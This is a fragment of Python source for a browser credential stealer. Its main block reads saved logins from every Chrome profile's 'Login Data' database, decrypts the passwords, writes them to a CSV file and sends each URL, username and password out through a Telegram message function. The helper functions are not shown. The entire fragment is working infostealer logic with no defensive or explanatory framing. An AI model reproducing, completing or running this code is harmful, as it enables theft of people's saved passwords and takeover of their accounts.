
if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if(url != "" and username != "" and ciphertext != ""):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index, url, username, decrypted_password])
                            message = f"<b>URL:</b> {url}\n<b>Username:</b> {username}\n<b>Password:</b> {decrypted_password}"
                            send_telegram_message(message)

                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] %s" % str(e))
